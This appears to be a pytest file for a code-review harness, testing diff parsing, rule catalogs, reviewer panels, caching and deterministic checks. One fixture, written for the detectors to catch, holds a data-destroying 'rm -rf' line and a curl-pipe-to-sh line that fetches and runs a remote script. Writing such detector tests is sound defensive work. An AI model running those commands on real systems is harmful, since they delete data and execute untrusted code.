"""The generic review framework (#57): diff, catalog, reviewers, signals, contract, cache and the
panel with a fake invoker (no provider, no network)."""

from __future__ import annotations

from collections.abc import Sequence
from pathlib import Path
from typing import Any

import pytest

from governed_harness.agents.routing import select_reviewer
from governed_harness.configuration.agent_results import AgentRoutingConfig
from governed_harness.configuration.review import (
    PanelBudget,
    ReviewPanelConfig,
    SecondOpinionConfig,
)
from governed_harness.domain.errors import ConfigurationError
from governed_harness.review import (
    ContractError,
    ReviewCache,
    ReviewerAnswer,
    ReviewerCall,
    builtin_rules,
    load_reviewers,
    merge,
    normalize,
    parse_diff,
    project_rules,
    render_block,
    reportable_locations,
    reviewer_key,
    run_panel,
    sync_blocks,
    verdict_of,
)
from governed_harness.review.checks import (
    dangerous_paths,
    tautological_assertions,
    temporary_files,
    weakened_gates,
)
from governed_harness.review.contract import ReviewFinding
from governed_harness.review.panel import PanelInputs, PanelReport
from governed_harness.review.reviewers import BEGIN_MARKER, END_MARKER, extract_block
from governed_harness.review.rules import Rule, pack_rules, parse_rules_markdown
from governed_harness.review.signals import activation, in_slice, slice_files
from governed_harness.standards import builtin_pack

DOMAINS = {"quality", "architecture", "resilience", "tests", "concurrency", "pipeline-security"}

DIFF = """\
--- a/src/app/service.py
+++ b/src/app/service.py
@@ -1,3 +1,5 @@
 import threading
-def run():
-    pass
+def run(client):
+    lock = threading.Lock()
+    return client.get(timeout=None)
+
--- /dev/null
+++ b/tests/test_service.py
@@ -0,0 +1,3 @@
+def test_run():
+    assert True
+    assert run(None) is None
--- a/scripts/ci.sh
+++ /dev/null
@@ -1,2 +0,0 @@
-#!/bin/sh
-pytest
--- a/.github/workflows/ci.yml
+++ b/.github/workflows/ci.yml
@@ -3,1 +3,2 @@
 run: pytest
+run: ruff check . || true
"""


# ----- diff -------------------------------------------------------------------------------------
def test_reportable_locations_follow_the_diff() -> None:
    files = parse_diff(DIFF)
    assert [item.path for item in files] == [
        "src/app/service.py",
        "tests/test_service.py",
        "scripts/ci.sh",
        ".github/workflows/ci.yml",
    ]
    locations = reportable_locations(files)
    assert locations.allows("src/app/service.py", "new", 2)
    assert locations.allows("src/app/service.py", "new", 5)
    assert locations.allows("src/app/service.py", "old", 3)
    assert not locations.allows("src/app/service.py", "new", 1)  # a context line
    assert not locations.allows("src/app/service.py", "old", 1)
    # A whole-file deletion is reviewable on its old side.
    assert locations.allows("scripts/ci.sh", "old", 1)
    assert locations.allows("scripts/ci.sh", "old", 2)
    assert locations.allows(".github/workflows/ci.yml", "new", 4)
    assert not locations.allows(".github/workflows/ci.yml", "new", 3)
    assert locations.as_ranges()["src/app/service.py"] == {"new": [[2, 5]], "old": [[2, 3]]}


def test_header_like_lines_inside_a_hunk_are_content() -> None:
    text = (
        "--- a/notes.txt\n+++ b/notes.txt\n@@ -1,2 +1,2 @@\n"
        "--- removed line that looks like a header\n"
        "+++ added line that looks like a header\n"
        " context\n"
    )
    files = parse_diff(text)
    assert len(files) == 1
    assert [line.text for line in files[0].removed] == ["-- removed line that looks like a header"]
    assert [line.text for line in files[0].added] == ["++ added line that looks like a header"]


def test_git_headers_binary_and_empty_files() -> None:
    text = (
        "diff --git a/img.png b/img.png\nnew file mode 100644\n"
        "Binary files /dev/null and b/img.png differ\n"
        "diff --git a/empty.txt b/empty.txt\ndeleted file mode 100644\n"
        "diff --git a/a.py b/a.py\nindex 1..2 100644\n--- a/a.py\n+++ b/a.py\n"
        "@@ -1 +1 @@\n-x = 1\n+x = 2\n"
        "Binary files differ: data.bin\n"
    )
    files = parse_diff(text)
    by_path = {item.path: item for item in files}
    assert by_path["img.png"].binary and by_path["img.png"].is_added
    assert by_path["empty.txt"].is_deleted
    assert by_path["a.py"].added[0].number == 1
    assert by_path["data.bin"].binary
    locations = reportable_locations(files)
    # An empty deleted file is still reviewable (line 1 of its old side).
    assert locations.allows("empty.txt", "old", 1)


# ----- catalog ----------------------------------------------------------------------------------
PROJECT_RULES = """\
---
domain: resilience
---

## project.client-timeout: The service client sets a timeout

- severity: blocking
- priority: 3
- when: a change calls the service client
- exceptions: health probes; local stubs
- supersedes: resilience.external-call-limits
- budget: 1 read

Every call through the service client passes an explicit timeout.

Bad:

```text
client.get(url)
```

Good:

```text
client.get(url, timeout=5)
```

## quality.misleading-name

- severity: warning

Project wording for misleading names.
"""


def test_project_rules_markdown_is_parsed(tmp_path: Path) -> None:
    rules = parse_rules_markdown(PROJECT_RULES, domain="ignored", source="x.md")
    rule = rules[0]
    assert rule.rule_id == "project.client-timeout"
    assert (rule.domain, rule.severity, rule.priority, rule.layer) == (
        "resilience",
        "blocking",
        3,
        "C",
    )
    assert rule.exceptions == ("health probes", "local stubs")
    assert rule.bad == ("client.get(url)",) and rule.good == ("client.get(url, timeout=5)",)
    assert rule.budget.max_reads == 1
    assert rule.rule == "Every call through the service client passes an explicit timeout."


def test_layers_merge_with_precedence_and_supersedes(tmp_path: Path) -> None:
    (tmp_path / ".harness" / "review" / "rules").mkdir(parents=True)
    (tmp_path / ".harness" / "review" / "rules" / "resilience.md").write_text(PROJECT_RULES)
    layers = [*builtin_rules(), *pack_rules([builtin_pack("python")]), *project_rules(tmp_path)]
    catalog = merge(layers, available_tools={"ruff"}, reviewer_domains=DOMAINS, workspace=tmp_path)
    # C replaces A with the same id.
    assert catalog.get("quality.misleading-name") is not None
    assert catalog.get("quality.misleading-name").layer == "C"  # type: ignore[union-attr]
    # supersedes removes the built-in rule, reported inactive with the reason.
    assert catalog.get("resilience.external-call-limits") is None
    reasons = {item.rule.rule_id: item.reason for item in catalog.inactive}
    assert reasons["resilience.external-call-limits"] == "superseded by project.client-timeout"
    # B: a card a configured tool verifies is a tool rule; one of an absent tool is inactive.
    assert catalog.get("python.no-mutable-defaults").by_tool  # type: ignore[union-attr]
    assert "mypy is not configured" in reasons["python.public-annotations"]
    # B: a card only a reviewer can judge is an AI rule of its pack domain.
    assert catalog.get("python.test-behaviour").domain == "tests"  # type: ignore[union-attr]
    assert catalog.summary()["byLayer"]["C"] == 2


def test_rules_without_their_input_are_inactive(tmp_path: Path) -> None:
    rules = [
        Rule.model_validate(
            {
                "id": "a.needs-file",
                "domain": "quality",
                "rule": "x",
                "requires": ["file:Dockerfile"],
            }
        ),
        Rule.model_validate({"id": "b.no-reviewer", "domain": "billing", "rule": "x"}),
    ]
    catalog = merge(rules, available_tools=set(), reviewer_domains=DOMAINS, workspace=tmp_path)
    assert not catalog.rules
    assert {item.reason for item in catalog.inactive} == {
        "input missing: no file matches Dockerfile",
        "input missing: no reviewer covers the domain billing",
    }
    (tmp_path / "Dockerfile").write_text("FROM scratch\n")
    catalog = merge(rules, available_tools=set(), reviewer_domains=DOMAINS, workspace=tmp_path)
    assert [rule.rule_id for rule in catalog.rules] == ["a.needs-file"]


def test_invalid_rule_is_a_configuration_error() -> None:
    with pytest.raises(ConfigurationError):
        parse_rules_markdown("## bad id\n\n- severity: fatal\n\nx\n", domain="quality", source="x")


# ----- reviewers --------------------------------------------------------------------------------
def _catalog(tmp_path: Path) -> Any:
    return merge(
        builtin_rules(), available_tools=set(), reviewer_domains=DOMAINS, workspace=tmp_path
    )


def test_builtin_reviewers_get_their_rules_block(tmp_path: Path) -> None:
    catalog = _catalog(tmp_path)
    reviewers = {item.reviewer_id: item for item in load_reviewers(tmp_path, catalog)}
    assert set(reviewers) == DOMAINS
    block = reviewers["tests"].block()
    assert block is not None and "`tests.mock-of-subject` (blocking" in block
    # A rule verified by a tool is never sent to a model.
    assert "tests.tautological-assertion" not in block
    assert "pipeline-security.weakened-gate" not in (reviewers["pipeline-security"].block() or "")


def test_rules_sync_writes_the_block_and_check_reports_drift(tmp_path: Path) -> None:
    agents = tmp_path / ".harness" / "review" / "agents"
    agents.mkdir(parents=True)
    path = agents / "payments.md"
    path.write_text(
        "---\nid: payments\ndomain: resilience\nactivation: always\n---\n"
        f"Review payments.\n\n{BEGIN_MARKER}\n{END_MARKER}\n"
    )
    catalog = _catalog(tmp_path)
    assert [item.status for item in sync_blocks(tmp_path, catalog, check=True)] == ["drift"]
    assert path.read_text().count("resilience.swallowed-exception") == 0
    assert [item.status for item in sync_blocks(tmp_path, catalog, check=False)] == ["updated"]
    text = path.read_text()
    assert text.startswith("---\nid: payments\n")
    assert extract_block(text) == render_block(catalog.for_domain("resilience"))
    assert [item.status for item in sync_blocks(tmp_path, catalog, check=True)] == ["unchanged"]


def test_project_reviewer_replaces_the_builtin_one(tmp_path: Path) -> None:
    agents = tmp_path / ".harness" / "review" / "agents"
    agents.mkdir(parents=True)
    (agents / "tests.md").write_text("---\ndomain: tests\ndiffSlice: [spec/**]\n---\nOurs.\n")
    reviewers = {item.reviewer_id: item for item in load_reviewers(tmp_path, _catalog(tmp_path))}
    assert reviewers["tests"].source == ".harness/review/agents/tests.md"
    assert reviewers["tests"].spec.diff_slice == ("spec/**",)
    only = load_reviewers(tmp_path, _catalog(tmp_path), enabled=("quality",))
    assert [item.reviewer_id for item in only] == ["quality"]


# ----- signals ----------------------------------------------------------------------------------
def test_slices_and_signals(tmp_path: Path) -> None:
    files = parse_diff(DIFF)
    assert in_slice("tests/test_service.py", "tests")
    assert in_slice(".github/workflows/ci.yml", "pipeline") and in_slice("scripts/x.py", "pipeline")
    assert not in_slice("tests/test_service.py", "sources")
    reviewers = {item.reviewer_id: item for item in load_reviewers(tmp_path, _catalog(tmp_path))}
    sources = slice_files(files, "sources")
    concurrency = activation(reviewers["concurrency"], sources, ("python",))
    assert concurrency.active and concurrency.signals == ("concurrency@src/app/service.py",)
    # The same change without a concurrency primitive does not activate the reviewer.
    quiet = parse_diff("--- a/src/a.py\n+++ b/src/a.py\n@@ -1 +1 @@\n-x = 1\n+x = 2\n")
    assert not activation(
        reviewers["concurrency"], slice_files(quiet, "sources"), ("python",)
    ).active
    # No changed test: no tests reviewer.
    assert not activation(reviewers["tests"], slice_files(quiet, "tests")).active


# ----- contract ---------------------------------------------------------------------------------
def _finding(**values: Any) -> dict[str, Any]:
    return {
        "file": "src/app/service.py",
        "side": "new",
        "line": 4,
        "rule": "resilience.external-call-limits",
        "severity": "error",
        "issue": "no timeout",
        **values,
    }


def _normalize(findings: list[dict[str, Any]], limit: int = 20) -> Any:
    files = parse_diff(DIFF)
    rules = {rule.rule_id: rule for rule in builtin_rules()}
    return normalize(
        "resilience",
        {"verdict": "PASS", "findings": findings, "summary": "s"},
        rules=rules,
        locations=reportable_locations(files),
        changes={item.path: item for item in files},
        limit=limit,
    )


def test_contract_rejects_malformed_answers() -> None:
    for answer in (
        [],
        {"findings": [], "summary": "s"},
        {"verdict": "OK", "findings": [], "summary": "s"},
        {"verdict": "PASS", "findings": [{"file": "a"}], "summary": "s"},
        {"verdict": "PASS", "findings": [_finding(side="both")], "summary": "s"},
        {"verdict": "PASS", "findings": [_finding(line=0)], "summary": "s"},
    ):
        with pytest.raises(ContractError):
            normalize(
                "x",
                answer,
                rules={},
                locations=reportable_locations([]),
                changes={},
                limit=5,
            )


def test_contract_drops_downgrades_orders_and_caps() -> None:
    normalized = _normalize(
        [
            _finding(line=99),  # outside the changed lines: dropped
            _finding(rule="quality.dead-code", line=2),  # warning rule: at most a suggestion
            _finding(rule="made.up", line=3),  # outside the catalog, no evidence: suggestion
            _finding(rule="made.up-too", line=4, evidence="client.get(timeout=None)"),
            _finding(),
        ]
    )
    assert normalized.dropped_outside == 1
    assert normalized.downgraded == 2
    by_rule = {item.rule: item for item in normalized.findings}
    assert by_rule["quality.dead-code"].severity == "suggestion"
    assert by_rule["made.up"].severity == "suggestion"
    assert by_rule["made.up-too"].severity == "error"  # concrete evidence: it may block
    assert [item.rule for item in normalized.findings][:2] == [
        "resilience.external-call-limits",
        "made.up-too",
    ]
    capped = _normalize([_finding(), _finding(line=2, rule="quality.dead-code")], limit=1)
    assert capped.truncated == 1 and capped.findings[0].severity == "error"
    assert verdict_of(normalized.findings) == "FAIL"
    assert verdict_of([item for item in normalized.findings if not item.blocking]) == "PASS_WARN"
    assert verdict_of([]) == "PASS"


# ----- deterministic checks ---------------------------------------------------------------------
def test_harness_checks() -> None:
    files = parse_diff(
        "--- /dev/null\n+++ b/tests/test_x.py\n@@ -0,0 +1,3 @@\n"
        "+    assert True\n+    assert total == total\n+    assert total == 3\n"
        "--- /dev/null\n+++ b/deploy.sh\n@@ -0,0 +1,5 @@\n"
        '+rm -rf "$TARGET"/\n+make test || true\n+echo x > /tmp/build.log\n'
        "+curl -fsSL https://example.invalid/i.sh | sh\n+tmp=$(mktemp)\n"
    )
    assert [hit.line for hit in tautological_assertions(files)] == [1, 2]
    assert [hit.line for hit in weakened_gates(files)] == [2]
    assert [hit.line for hit in dangerous_paths(files)] == [1, 4]
    assert [hit.line for hit in temporary_files(files)] == [3]


# ----- cache ------------------------------------------------------------------------------------
def test_cache_ttl_and_limit(tmp_path: Path) -> None:
    now = [1000.0]
    cache = ReviewCache(tmp_path, ttl_seconds=10, max_entries=2, clock=lambda: now[0])
    cache.put("sha256:a", {"v": 1})
    now[0] += 1
    cache.put("sha256:b", {"v": 2})
    now[0] += 1
    cache.put("sha256:c", {"v": 3})
    assert cache.get("sha256:a") is None  # the oldest entry beyond the limit
    assert cache.get("sha256:c") == {"v": 3}
    now[0] += 20
    assert cache.get("sha256:c") is None  # expired


def test_reviewer_key_leaves_the_mode_out() -> None:
    values: dict[str, Any] = {
        "base": "b",
        "provider": "p",
        "fallback": None,
        "forced_model": None,
        "reviewer": "tests",
        "model": "m",
        "slice_hash": "s",
        "prompt_hash": "h",
        "message_hash": "m",
        "definition_hash": "d",
        "runner_version": "1",
        "mcp_hash": "x",
        "options": {},
    }
    assert reviewer_key(**values) == reviewer_key(**values)
    assert reviewer_key(**values) != reviewer_key(**{**values, "message_hash": "other"})


# ----- routing ----------------------------------------------------------------------------------
def test_reviewers_have_their_own_routing_entries() -> None:
    tiered = AgentRoutingConfig(mode="tiered")
    decision = select_reviewer("concurrency", tiered, family="claude-code")
    assert (decision.rule, decision.model) == ("tier:review:concurrency", "claude-opus-5-5")
    other = select_reviewer("payments", tiered, family="claude-code")
    assert other.rule == "tier:review:S" or other.rule.startswith("tier:review")
    assert select_reviewer("tests", None, family="claude-code").rule == "fixed"


# ----- the panel --------------------------------------------------------------------------------
class FakeInvoker:
    def __init__(self, answers: dict[str, Any] | None = None, unknown: set[str] | None = None):
        self.answers = answers or {}
        self.unknown = unknown or set()
        self.calls: list[ReviewerCall] = []
        self.workers: list[int] = []

    def invoke(self, calls: Sequence[ReviewerCall], workers: int) -> list[ReviewerAnswer]:
        self.workers.append(workers)
        out = []
        for call in calls:
            self.calls.append(call)
            if call.reviewer in self.unknown:
                out.append(
                    ReviewerAnswer("ANSWERED", {"findings": []}, "bad", call.provider, tokens=5)
                )
                continue
            findings = self.answers.get(call.reviewer, [])
            out.append(
                ReviewerAnswer(
                    "ANSWERED",
                    {"verdict": "PASS", "findings": findings, "summary": "done"},
                    "done",
                    call.provider,
                    model="m",
                    tokens=100,
                )
            )
        return out


def _inputs(tmp_path: Path, invoker: FakeInvoker, **values: Any) -> PanelInputs:
    catalog = _catalog(tmp_path)
    settings = values.pop("settings", ReviewPanelConfig(mode="enforce"))
    return PanelInputs(
        workspace=tmp_path,
        diff_text=values.pop("diff_text", DIFF),
        mode=values.pop("mode", "manual"),
        catalog=catalog,
        reviewers=load_reviewers(tmp_path, catalog),
        settings=settings,
        provider="primary",
        invoker=invoker,
        route=lambda reviewer, provider: (None, reviewer.spec.effort),
        runner_version="test",
        packs=("python",),
        **values,
    )


def test_panel_runs_reviewers_on_signals_and_never_sends_tool_rules(tmp_path: Path) -> None:
    invoker = FakeInvoker()
    report = run_panel(_inputs(tmp_path, invoker))
    called = sorted(call.reviewer for call in invoker.calls)
    # No external call pattern of the python pack on a changed line: no resilience reviewer.
    assert called == ["architecture", "concurrency", "pipeline-security", "quality", "tests"]
    statuses = {item.reviewer: item.status for item in report.reviewers}
    assert statuses["resilience"] == "SKIPPED"
    for call in invoker.calls:
        assert "tests.tautological-assertion" not in call.request["instructions"]
        assert "weakened-gate" not in call.request["instructions"]
        assert call.request["readOnly"] is True and call.request["outputContract"]
    # The deterministic rules found what they verify, without any model.
    assert {(item.rule, item.source) for item in report.findings} == {
        ("tests.tautological-assertion", "tool:harness:tautological-assertion"),
        ("pipeline-security.weakened-gate", "tool:harness:weakened-gates"),
    }
    assert report.verdict == "FAIL" and report.blocking
    assert invoker.workers == [4]


def test_budget_is_proportional_to_the_slice(tmp_path: Path) -> None:
    settings = ReviewPanelConfig(
        mode="enforce", budget=PanelBudget(baseTokens=100, tokensPerLine=10, maxTokens=10_000)
    )
    invoker = FakeInvoker()
    run_panel(_inputs(tmp_path, invoker, settings=settings))
    budgets = {call.reviewer: call.max_tokens for call in invoker.calls}
    assert budgets["quality"] == 100 + 10 * 6
    assert budgets["tests"] == 100 + 10 * 3
    assert all(call.request["budget"]["maxTokens"] == call.max_tokens for call in invoker.calls)


def test_unknown_answer_is_retried_on_the_fallback_and_then_blocks(tmp_path: Path) -> None:
    invoker = FakeInvoker(unknown={"quality"})
    report = run_panel(_inputs(tmp_path, invoker, fallback="secondary"))
    attempts = [
        (call.provider, call.attempt) for call in invoker.calls if call.reviewer == "quality"
    ]
    assert attempts == [("primary", 1), ("secondary", 2)]
    assert report.verdict == "UNKNOWN" and report.blocking
    outcome = next(item for item in report.reviewers if item.reviewer == "quality")
    assert outcome.status == "UNKNOWN" and outcome.attempts == 2


def test_failed_consistency_check_calls_no_model(tmp_path: Path) -> None:
    invoker = FakeInvoker()
    report = run_panel(
        _inputs(
            tmp_path,
            invoker,
            consistency=lambda: [{"id": "schema", "status": "FAILED", "summary": "drift"}],
        )
    )
    assert invoker.calls == []
    assert report.verdict == "FAIL"
    assert {item.status for item in report.reviewers} == {"SKIPPED"}


def test_caches_skip_repeated_calls_and_share_answers_across_modes(tmp_path: Path) -> None:
    quiet = "--- a/src/a.py\n+++ b/src/a.py\n@@ -1 +1 @@\n-x = 1\n+x = 2\n"
    cache = ReviewCache(tmp_path / "cache", ttl_seconds=3600, max_entries=50)
    invoker = FakeInvoker()
    first = run_panel(_inputs(tmp_path, invoker, diff_text=quiet, cache=cache))
    calls = len(invoker.calls)
    assert first.verdict == "PASS" and first.cache == "miss" and calls == 1
    again = run_panel(_inputs(tmp_path, invoker, diff_text=quiet, cache=cache))
    assert again.cache == "hit" and len(invoker.calls) == calls
    assert again.digest == first.digest
    hook = run_panel(_inputs(tmp_path, invoker, diff_text=quiet, cache=cache, mode="hook"))
    assert hook.cache == "miss" and hook.reviewer_cache_hits == 1
    assert len(invoker.calls) == calls  # every reviewer answer reused


def test_report_is_deterministic(tmp_path: Path) -> None:
    answers = {
        "quality": [
            _finding(rule="quality.wrong-logic", line=2, issue="wrong"),
            _finding(rule="quality.dead-code", line=3, issue="dead"),
        ]
    }
    first = run_panel(_inputs(tmp_path, FakeInvoker(answers)))
    second = run_panel(_inputs(tmp_path, FakeInvoker(answers)))
    assert first.body() == second.body() and first.digest == second.digest
    restored = PanelReport.from_dict(first.as_dict())
    assert restored.digest == first.digest


def test_second_opinion_downgrades_unconfirmed_blocking_findings(tmp_path: Path) -> None:
    quiet = "--- a/src/a.py\n+++ b/src/a.py\n@@ -1 +1,2 @@\n-x = 1\n+x = 2\n+y = 3\n"
    answers = {
        "quality": [
            {
                "file": "src/a.py",
                "side": "new",
                "line": 1,
                "rule": "quality.wrong-logic",
                "severity": "error",
                "issue": "a",
            },
            {
                "file": "src/a.py",
                "side": "new",
                "line": 2,
                "rule": "quality.wrong-logic",
                "severity": "error",
                "issue": "b",
            },
        ],
        "second-opinion": [
            {
                "file": "src/a.py",
                "side": "new",
                "line": 2,
                "rule": "quality.wrong-logic",
                "severity": "error",
                "issue": "b",
            },
        ],
    }
    settings = ReviewPanelConfig(
        mode="enforce", second_opinion=SecondOpinionConfig(mode="blocking")
    )
    invoker = FakeInvoker(answers)
    report = run_panel(_inputs(tmp_path, invoker, diff_text=quiet, settings=settings))
    by_line = {item.line: item for item in report.findings}
    assert by_line[2].severity == "error"
    assert by_line[1].severity == "suggestion"
    assert by_line[1].note == "not confirmed by the second opinion"
    assert report.second_opinion == {
        "provider": "primary",
        "tokens": 100,
        "status": "ANSWERED",
        "confirmed": 1,
        "refuted": 1,
    }


def test_review_finding_round_trip() -> None:
    finding = ReviewFinding("r", "a.py", "old", 3, "x.y", "error", "issue", evidence="e", note="n")
    assert ReviewFinding.from_dict(finding.as_dict()) == finding
